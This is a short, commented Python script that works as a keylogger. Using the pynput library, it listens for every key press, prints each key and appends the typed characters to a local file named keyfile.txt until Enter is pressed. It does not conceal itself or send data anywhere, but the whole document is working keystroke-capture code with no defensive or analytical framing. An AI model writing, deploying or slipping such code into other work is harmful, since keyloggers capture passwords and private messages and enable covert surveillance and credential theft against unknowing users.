# Import the keyboard module from pynput library
from pynput import keyboard


def keyPressed(key):
    # Function to handle key press events

    # Print the string representation of the pressed key
    print(str(key))

    # Open a file named "keyfile.txt" in append mode
    with open("keyfile.txt", 'a') as logKey:
        try:
            # Attempt to get the character representation of the key
            char = key.char
            # Write the character to the file
            logKey.write(char)
        except:
            # If an exception occurs (e.g., for special keys), print an error message
            print("Error getting char")


# Check if this script is being run directly (not imported)
if __name__ == "__main__":
    # Create a keyboard listener that calls keyPressed function on each key press
    listener = keyboard.Listener(on_press=keyPressed)

    # Start the listener in a non-blocking fashion
    listener.start()

    # Keep the script running until user presses Enter
    input()